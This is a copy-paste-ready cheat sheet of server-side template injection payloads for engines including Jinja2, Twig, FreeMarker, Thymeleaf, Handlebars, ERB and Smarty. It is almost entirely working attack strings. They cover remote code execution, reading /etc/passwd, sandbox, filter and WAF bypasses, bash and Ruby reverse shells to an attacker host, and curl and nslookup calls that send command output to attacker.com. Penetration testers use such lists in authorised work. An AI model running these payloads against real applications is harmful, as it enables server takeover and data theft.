# Server-Side Template Injection (SSTI) Payloads by Engine

> Copy-paste ready payloads for detecting and exploiting SSTI vulnerabilities.
> Replace `INJECT` with your injection point. Test detection first, then escalate.

---

## Detection (Universal Probes)

Use these first to determine if SSTI exists and which engine is in use:

```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{7*'7'}}
${{7*7}}
```

### Decision Tree
```
${7*7} = 49?
  ├── Yes → ${7*'7'}
  │         ├── 7777777 → Jinja2/Twig
  │         └── 49      → Twig/Unknown
  └── No  → {{7*7}} = 49?
            ├── Yes → {{7*'7'}}
            │         ├── 7777777 → Jinja2
            │         └── 49      → Twig
            └── No  → <%= 7*7 %> = 49?
                      ├── Yes → ERB
                      └── No  → #{7*7} = 49?
                                ├── Yes → Pug/Jade or Thymeleaf
                                └── No  → Other engine
```

---

## Jinja2 (Python — Flask, Django)

### Detection
```
{{7*7}}
{{7*'7'}}
{{config}}
{{config.items()}}
{{self.__class__}}
{{request.application.__self__._get_data_for_json.__globals__}}
{{''.__class__}}
```

### RCE — MRO Chain (Python 3)
```
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[2].__subclasses__()}}
{{''.__class__.__bases__[0].__subclasses__()}}
```

#### Find os._wrap_close (typically index ~132-140)
```
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}
```

#### Automated subclass search
```
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
{% if 'warning' in c.__name__ %}
{{c.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
{% endif %}
{% endfor %}
```

### RCE — Direct Methods
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}
```

### RCE — __builtins__
```
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
{{().__class__.__bases__[0].__subclasses__()[X].__init__.__globals__['__builtins__']['eval']("__import__('os').system('id')")}}
```

### Sandbox Escape — Bypassing Restricted Characters
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

#### Bypassing `_` filter
```
{{request|attr(request.args.a)}}&a=__class__
{{''['\x5f\x5fclass\x5f\x5f']}}
{{''|attr('\x5f\x5fclass\x5f\x5f')}}
{% set x = lipsum|string|list %}{{x[18]}}  → gets underscore
```

#### Bypassing `.` filter
```
{{''['__class__']['__mro__'][1]['__subclasses__']()}}
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}
```

#### Bypassing `[]` filter
```
{{''.__class__.__mro__.__getitem__(1)}}
{{''|attr('__class__')|attr('__mro__')|first}}
```

### File Read
```
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
{{get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read()}}
```

---

## Twig (PHP — Symfony)

### Detection
```
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{'test'|upper}}
```

### RCE (Twig < 1.19)
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

### RCE (Twig 1.x)
```
{{'/etc/passwd'|file_excerpt(1,30)}}
{{app.request.server.all|join(',')}}
```

### RCE (Twig 2.x / 3.x)
```
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('exec')}}
{{['id']|map('system')}}
{{['id']|map('passthru')}}
{{['id']|sort('system')}}
{{['cat${IFS}/etc/passwd']|filter('system')}}
```

### File Read
```
{{'/etc/passwd'|file_excerpt(-1,-1)}}
{{source('/etc/passwd')}}
{{include('/etc/passwd')}}
```

---

## Velocity (Java)

### Detection
```
#set($x=7*7)${x}
$class.inspect("java.lang.Runtime")
#set($str=$class.inspect("java.lang.String").type)
${7*7}
$foo
#if(true)yes#{else}no#end
```

### RCE
```
#set($runtime=Class.forName("java.lang.Runtime"))
#set($method=$runtime.getMethod("getRuntime",null))
#set($obj=$method.invoke(null,null))
#set($exec=$runtime.getMethod("exec","".getClass()))
$exec.invoke($obj,"id")

#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$chr.toChars($out.read())#end
```

### Alternative Methods
```
#set($e="e]")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id").waitFor()
```

---

## FreeMarker (Java)

### Detection
```
${7*7}
<#assign x=7*7>${x}
${.version}
${.now}
${"freemarker.template.utility.Execute"?new()("id")}
```

### RCE
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}
${"freemarker.template.utility.Execute"?new()("id")}
```

### RCE via ObjectConstructor
```
<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
<#assign rt=oc("java.lang.ProcessBuilder",["id"])>
${rt.start().inputStream.text}
```

### RCE via JythonRuntime
```
<#assign jr="freemarker.template.utility.JythonRuntime"?new()>
<@jr>import os;os.system("id")</@jr>
```

### Sandbox Bypass
```
<#assign classloader=object?api.class.protectionDomain.classLoader>
<#assign url=classloader.loadClass("java.lang.ProcessBuilder")>
<#assign pb=url.getDeclaredConstructors()[0].newInstance(["id"])>
${pb.start().inputStream.text}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().text}
```

### File Read
```
<#assign is=object?api.class.getResourceAsStream("/etc/passwd")>
<#assign reader="java.io.InputStreamReader"?new(is)>
<#assign br="java.io.BufferedReader"?new(reader)>
<#list 1..999 as _><#if br.readLine()??>${br.readLine()}\n</#if></#list>
```

---

## Thymeleaf (Java / Spring)

### Detection (Expression in attributes)
```
${7*7}
${T(java.lang.Runtime).getRuntime()}
*{T(java.lang.Runtime).getRuntime()}
#{T(java.lang.Runtime).getRuntime()}
```

### SpEL Injection via Thymeleaf
```
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(java.lang.Runtime).getRuntime().exec(new String[]{'cat','/etc/passwd'})}
${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
```

### URL-Based Injection (Path traversal to template)
```
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next()}__::.x
```

### Pre-processing
```
__${T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwned')}__::.x
__${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}__::.x
```

### Spring View Name Manipulation
```
GET /path?lang=__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
GET /doc/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

---

## Handlebars (Node.js)

### Detection
```
{{this}}
{{this.constructor}}
{{#with "s" as |string|}}{{string.toString}}{{/with}}
```

### RCE
```
{{#with "s" as |string|}}
  {{#with "e])}catch(e){return global.process.mainModule.require('child_process').execSync('id');}//e" as |evil|}}
    {{#with string.sub.apply 0 evil}}
    {{/with}}
  {{/with}}
{{/with}}
```

### RCE (Handlebars < 4.3.0 — prototype pollution)
```
{{constructor.constructor('return this.process.mainModule.require("child_process").execSync("id").toString()')()}}
```

### Alternative
```
{{#with (lookup this "constructor")}}
  {{#with (lookup this "constructor")}}
    {{this (string "return global.process.mainModule.require('child_process').execSync('id').toString()")}}
  {{/with}}
{{/with}}
```

---

## Pug / Jade (Node.js)

### Detection
```
#{7*7}
#{self}
-var x=7*7;
=7*7
p=7*7
```

### RCE
```
#{global.process.mainModule.require('child_process').execSync('id').toString()}
-var x=global.process.mainModule.require('child_process').execSync('id').toString()
=global.process.mainModule.require('child_process').execSync('id')
```

### RCE via each
```
- var x = root.process.mainModule.require('child_process').execSync('id');
each val, index in x
  p= val
```

### File Read
```
#{global.process.mainModule.require('fs').readFileSync('/etc/passwd','utf8')}
```

---

## ERB (Ruby — Rails)

### Detection
```
<%= 7*7 %>
<%= self %>
<%= Dir.entries('/') %>
<%= File.open('/etc/passwd').read %>
```

### RCE
```
<%= system('id') %>
<%= `id` %>
<%= exec('id') %>
<%= IO.popen('id').read %>
<%= open('|id').read %>
<%= %x(id) %>
<%=require 'open3'; Open3.capture2('id')[0]%>
```

### File Operations
```
<%= File.open('/etc/passwd').read %>
<%= Dir.entries('/') %>
<%= File.directory?('/tmp') %>
<%= Dir.glob('/**/*').select{|f| f.include?('secret')} %>
```

### Reverse Shell
```
<%= system("bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'") %>
<%= `ruby -rsocket -e'f=TCPSocket.open("ATTACKER",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` %>
```

---

## Smarty (PHP)

### Detection
```
{7*7}
{$smarty.version}
{php}echo 'test';{/php}
{self::getStreamVariable("file:///etc/passwd")}
```

### RCE (Smarty < 3)
```
{php}system('id');{/php}
{php}passthru('id');{/php}
{php}echo shell_exec('id');{/php}
```

### RCE (Smarty 3.x — {if} tag)
```
{if system('id')}{/if}
{if exec('id')}{/if}
{if passthru('id')}{/if}
{if shell_exec('id')}{/if}
```

### RCE (Smarty 3.x — tags)
```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>",self::clearConfig())}
{system('id')}
```

### File Read
```
{fetch file='/etc/passwd'}
{include file='/etc/passwd'}
{self::getStreamVariable("file:///etc/passwd")}
```

---

## Spring Expression Language (SpEL)

### Detection
```
${7*7}
#{7*7}
T(java.lang.Math).random()
new java.lang.String("test")
```

### RCE
```
T(java.lang.Runtime).getRuntime().exec('id')
T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id'})
new java.lang.ProcessBuilder(new String[]{'id'}).start()
```

### RCE with Output
```
T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())
new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()
```

### Bypass Techniques

#### Without T()
```
''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')
```

#### String concatenation to evade WAF
```
T(java.lang.Ru#{ntime}).getRu#{ntime}().exec('id')
T(String).join('','java.la','ng.Runti','me')
new java.lang.ProcessBuilder({'b'+'ash','-c','id'}).start()
```

#### Reflection
```
#{''.class.forName('java.lang.Runtime').getDeclaredMethods()[6].invoke(''.class.forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(null),'id')}
```

#### Using ScriptEngine
```
new javax.script.ScriptEngineManager().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec("id")')
new javax.script.ScriptEngineManager().getEngineByName('nashorn').eval('var x=new java.lang.ProcessBuilder;x.command("id");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())')
```

### File Read
```
new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter('\\Z').next()
T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))
```

---

## EL (Expression Language — JSP/JSF)

### Detection
```
${7*7}
#{7*7}
${applicationScope}
${header}
${initParam}
```

### RCE (EL 3.0+)
```
${Runtime.getRuntime().exec("id")}
${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
```

### RCE (JSF/Seam)
```
#{facesContext.getExternalContext().getResponse().getWriter().write("test")}
#{session.setAttribute("x","".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id"))}
```

---

## Mako (Python)

### Detection
```
${7*7}
<%import os%>${os.popen("id").read()}
```

### RCE
```
<%import os%>${os.popen("id").read()}
<%import subprocess%>${subprocess.check_output("id",shell=True)}
${self.module.cache.util.os.popen("id").read()}
```

### File Read
```
${open("/etc/passwd").read()}
<%f=open("/etc/passwd")%>${f.read()}
```

---

## Tornado (Python)

### Detection
```
{{7*7}}
{%import os%}{{os.popen("id").read()}}
```

### RCE
```
{%import os%}{{os.popen("id").read()}}
{%import subprocess%}{{subprocess.check_output("id",shell=True)}}
```

---

## Tips & Tricks

### Polyglot Payloads
```
${{<%[%'"}}%\.
${7*7}{{7*7}}<%= 7*7 %>#{7*7}*{7*7}
```

### Identifying Engine from Error
| Error Contains              | Likely Engine      |
|----------------------------|--------------------|
| `jinja2`                   | Jinja2             |
| `Twig_Error`              | Twig               |
| `freemarker`              | FreeMarker         |
| `velocity`                | Velocity           |
| `TemplateDoesNotExist`    | Django             |
| `org.thymeleaf`           | Thymeleaf          |
| `PugException`            | Pug                |
| `SyntaxError` + template  | Handlebars/EJS     |
| `ActionView::Template`    | ERB (Rails)        |
| `Smarty`                  | Smarty             |

### Blind SSTI Confirmation
```
OOB via DNS:    {{config.__class__.__init__.__globals__['os'].popen('nslookup test.attacker.com').read()}}
OOB via HTTP:   {{config.__class__.__init__.__globals__['os'].popen('curl attacker.com/?x=`id`').read()}}
Time delay:     {{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}
```
